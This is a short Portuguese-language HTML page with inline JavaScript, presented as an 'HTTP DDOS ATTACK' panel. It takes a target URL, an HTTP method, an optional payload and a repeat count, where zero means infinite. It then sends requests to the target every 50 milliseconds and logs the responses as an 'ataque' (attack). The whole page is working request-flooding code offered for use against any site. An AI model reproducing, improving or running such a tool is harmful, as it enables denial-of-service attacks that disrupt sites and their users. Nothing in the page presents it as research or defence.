<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>EG Webcode Attack DDOS Painel</title>
  <style>
    body {
      margin: 0;
      padding: 20px;
      font-family: monospace;
      background: #000;
      color: #0f0;
    }
    h2 {
      text-align: center;
      color: #0f0;
      margin-bottom: 15px;
    }
    input, select, textarea, button {
      width: 100%;
      margin-bottom: 10px;
      padding: 12px;
      font-size: 16px;
      background: #111;
      border: 1px solid #0f0;
      color: #0f0;
      border-radius: 8px;
      box-sizing: border-box;
    }
    button {
      background: #0f0;
      color: #000;
      font-weight: bold;
    }
    #log {
      background: #111;
      border: 1px solid #0f0;
      padding: 10px;
      height: 200px;
      overflow-y: auto;
      border-radius: 8px;
      font-size: 14px;
    }
    .buttons {
      display: flex;
      gap: 10px;
    }
    .buttons button {
      flex: 1;
    }
  </style>
</head>
<body>

  <h2>EG WEBCODE HTTP DDOS ATTACK</h2>

  <label>üåç URL do alvo:</label>
  <input type="text" id="url" placeholder="https://site.com/api">

  <label>‚öôÔ∏è M√©todo HTTP:</label>
  <select id="metodo">
    <option>GET</option>
    <option>POST</option>
    <option>PUT</option>
    <option>PATCH</option>
    <option>DELETE</option>
  </select>

  <label>üì¶ Payload (opcional):</label>
  <textarea id="payload" placeholder='{"chave":"valor"}'></textarea>

  <label>üîÅ Repeti√ß√µes (0 = infinito):</label>
  <input type="number" id="vezes" value="10" min="0">

  <div class="buttons">
    <button onclick="iniciar()">‚ñ∂Ô∏è INICIAR</button>
    <button onclick="parar()">‚èπÔ∏è PARAR</button>
  </div>

  <div id="log"></div>

  <script>
    let intervalo, contador = 0, rodando = false;

    function logar(msg) {
      const log = document.getElementById('log');
      log.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
      log.scrollTop = log.scrollHeight;
    }

    async function enviarRequisicao(url, metodo, payload) {
      try {
        const config = {
          method: metodo,
          headers: { 'Content-Type': 'application/json' }
        };

        if (["POST", "PATCH", "PUT"].includes(metodo.toUpperCase()) && payload.trim()) {
          config.body = payload;
        }

        const res = await fetch(url, config);
        logar(`${metodo} ‚Üí ${res.status}`);
      } catch (e) {
        logar(`${metodo} ‚Üí ERRO`);
      }
    }

    function iniciar() {
      if (rodando) return;
      const url = document.getElementById('url').value;
      const metodo = document.getElementById('metodo').value;
      const payload = document.getElementById('payload').value;
      let vezes = parseInt(document.getElementById('vezes').value);
      contador = 0;
      rodando = true;

      logar("üöÄ Iniciando ataque...");

      intervalo = setInterval(() => {
        if (!rodando) return clearInterval(intervalo);
        enviarRequisicao(url, metodo, payload);
        contador++;
        if (vezes !== 0 && contador >= vezes) {
          parar();
        }
      }, 50); // 20 req/s
    }

    function parar() {
      rodando = false;
      clearInterval(intervalo);
      logar("üõë Ataque parado.");
    }
  </script>

</body>
</html>
